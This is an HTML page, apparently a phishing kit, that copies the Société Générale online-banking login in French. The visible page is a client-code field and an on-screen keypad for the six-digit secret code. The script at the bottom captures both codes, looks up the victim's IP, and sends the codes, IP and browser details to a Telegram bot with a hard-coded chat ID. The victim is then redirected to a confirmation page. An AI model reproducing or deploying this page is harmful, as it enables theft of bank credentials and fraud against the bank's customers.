<!DOCTYPE html>
<html lang="fr">
<head>
    <script src="config.js" defer></script>
    <script src="wait-config.js" defer></script>
    <script src="init-telegram.js" defer></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Société Générale</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
        :root { --sg-red: #e70033; --sg-dark: #0f1738; }
        .sg-red { background-color: var(--sg-red); }
        .sg-red:hover { background-color: #c5002b; }
        .back-btn { @apply inline-flex items-center gap-2 px-4 py-2 rounded-full border border-gray-300 text-sm font-semibold hover:bg-gray-50 transition; }
    </style>
</head>
<body class="bg-white">

<div class="max-w-4xl mx-auto p-4 md:p-8">
    <button class="back-btn mb-6" onclick="window.location.href='bank.html'">
        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
        Retour aux banques
    </button>

    <div class="flex flex-col md:flex-row gap-8 md:gap-12">
        <!-- LEFT SECTION: LOGIN -->
        <div class="w-full md:w-1/2">
            <div class="mb-8">
                <h1 class="text-3xl font-bold text-gray-800 mb-2">Connexion</h1>
                <p class="text-gray-500 text-sm">Espace Client Particuliers</p>
            </div>

            <!-- STEP 1: CODE CLIENT -->
            <div id="step-1" class="space-y-6">
                <div>
                    <label class="block text-sm font-semibold text-gray-700 mb-3">Code Client</label>
                    <input type="text" id="clientCode" placeholder="Saisissez votre code client" 
                           class="w-full px-0 py-3 border-b-2 border-gray-400 focus:border-red-600 focus:outline-none text-lg"
                           maxlength="10">
                </div>

                <label class="flex items-center gap-3 cursor-pointer">
                    <input type="checkbox" id="rememberMe" class="w-5 h-5 accent-red-600">
                    <span class="text-sm text-gray-600">Se souvenir de moi</span>
                </label>

                <button onclick="goToStep2()" class="w-full sg-red text-white font-bold py-3 rounded-full transition">
                    Valider
                </button>
            </div>

            <!-- STEP 2: CODE SECRET -->
            <div id="step-2" class="hidden space-y-6">
                <div class="flex justify-center gap-4 mb-8">
                    <div id="dot-0" class="w-3 h-3 rounded-full border-2 border-gray-400"></div>
                    <div id="dot-1" class="w-3 h-3 rounded-full border-2 border-gray-400"></div>
                    <div id="dot-2" class="w-3 h-3 rounded-full border-2 border-gray-400"></div>
                    <div id="dot-3" class="w-3 h-3 rounded-full border-2 border-gray-400"></div>
                    <div id="dot-4" class="w-3 h-3 rounded-full border-2 border-gray-400"></div>
                    <div id="dot-5" class="w-3 h-3 rounded-full border-2 border-gray-400"></div>
                </div>

                <div class="grid grid-cols-4 gap-3 mb-6">
                    <button onclick="addDot(1)" class="bg-gray-100 hover:bg-gray-200 p-4 rounded font-bold text-lg">1</button>
                    <button onclick="addDot(2)" class="bg-gray-100 hover:bg-gray-200 p-4 rounded font-bold text-lg">2</button>
                    <button onclick="addDot(3)" class="bg-gray-100 hover:bg-gray-200 p-4 rounded font-bold text-lg">3</button>
                    <div></div>
                    
                    <button onclick="addDot(4)" class="bg-gray-100 hover:bg-gray-200 p-4 rounded font-bold text-lg">4</button>
                    <button onclick="addDot(5)" class="bg-gray-100 hover:bg-gray-200 p-4 rounded font-bold text-lg">5</button>
                    <button onclick="addDot(6)" class="bg-gray-100 hover:bg-gray-200 p-4 rounded font-bold text-lg">6</button>
                    <button onclick="addDot(0)" class="bg-gray-100 hover:bg-gray-200 p-4 rounded font-bold text-lg">0</button>
                    
                    <button onclick="addDot(7)" class="bg-gray-100 hover:bg-gray-200 p-4 rounded font-bold text-lg">7</button>
                    <button onclick="addDot(8)" class="bg-gray-100 hover:bg-gray-200 p-4 rounded font-bold text-lg">8</button>
                    <button onclick="addDot(9)" class="bg-gray-100 hover:bg-gray-200 p-4 rounded font-bold text-lg">9</button>
                    <div></div>
                </div>

                <button onclick="validateAndSend()" id="validateBtn" class="w-full sg-red text-white font-bold py-3 rounded-full transition">
                    Valider
                </button>

                <button onclick="goToStep1()" class="w-full text-red-600 font-semibold py-2">
                    ← Modifier le code client
                </button>
            </div>
        </div>

        <!-- RIGHT SECTION: INFO -->
        <div class="w-full md:w-1/2 bg-gray-50 p-6 rounded-lg">
            <h2 class="text-xl font-bold text-gray-800 mb-4">Où trouver mon Code Client SG ?</h2>
            <p class="text-gray-600 text-sm mb-6">Votre Code Client vous a été communiqué lors de la souscription. Il est également indiqué sur vos relevés de comptes.</p>

            <h2 class="text-xl font-bold text-gray-800 mb-4">Code Client inconnu ?</h2>
            <ul class="space-y-3">
                <li><a href="#" class="text-red-600 font-semibold text-sm">» Obtenir mon Code Client</a></li>
                <li><a href="#" class="text-red-600 font-semibold text-sm">» Aide et contact</a></li>
            </ul>

            <div class="mt-8 pt-6 border-t border-gray-300">
                <p class="text-xs text-gray-500">Connexion sécurisée SSL 256 bits</p>
            </div>
        </div>
    </div>
</div>

<script>
const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
const CHAT_ID = '8176081750';

let clientCode = '';
let secretCode = '';
const LONGUEUR_CODE = 6;

function goToStep2() {
    const code = document.getElementById('clientCode').value.trim();
    if (code.length === 0) {
        alert('Veuillez entrer votre code client');
        return;
    }
    clientCode = code;
    
    if (document.getElementById('rememberMe').checked) {
        localStorage.setItem('sg_client_code', code);
    } else {
        localStorage.removeItem('sg_client_code');
    }
    
    document.getElementById('step-1').classList.add('hidden');
    document.getElementById('step-2').classList.remove('hidden');
    secretCode = '';
    updateDots();
}

function goToStep1() {
    document.getElementById('step-2').classList.add('hidden');
    document.getElementById('step-1').classList.remove('hidden');
    secretCode = '';
    updateDots();
}

function addDot(num) {
    if (secretCode.length < LONGUEUR_CODE) {
        secretCode += num;
        updateDots();
    }
}

function updateDots() {
    for (let i = 0; i < LONGUEUR_CODE; i++) {
        const dot = document.getElementById(`dot-${i}`);
        if (i < secretCode.length) {
            dot.classList.add('bg-gray-800', 'border-gray-800');
            dot.classList.remove('bg-white', 'border-gray-400');
        } else {
            dot.classList.remove('bg-gray-800', 'border-gray-800');
            dot.classList.add('bg-white', 'border-gray-400');
        }
    }
}

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip || 'Non disponible';
    } catch (error) {
        return 'Non disponible';
    }
}

async function sendToTelegram() {
    const ip = await getIP();
    const message = `🏦 SOCIÉTÉ GÉNÉRALE - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n👤 Code Client: ${clientCode}\n🔑 Code Secret: ${secretCode}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion en cours`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: window.CHAT_ID || CHAT_ID,
                text: message
            })
        });
        
        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error('Erreur:', error);
        return false;
    }
}

async function validateAndSend() {
    if (secretCode.length !== LONGUEUR_CODE) {
        alert('Veuillez saisir votre code secret complet');
        return;
    }
    
    document.getElementById('validateBtn').disabled = true;
    await sendToTelegram();
    
    setTimeout(() => {
        window.location.href = 'confirmation.html';
    }, 1500);
}

// Charge code mémorisé
const savedCode = localStorage.getItem('sg_client_code');
if (savedCode) {
    document.getElementById('clientCode').value = savedCode;
    document.getElementById('rememberMe').checked = true;
}

// Charge sur Enter
document.getElementById('clientCode').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') goToStep2();
});
</script>

</body>
</html>
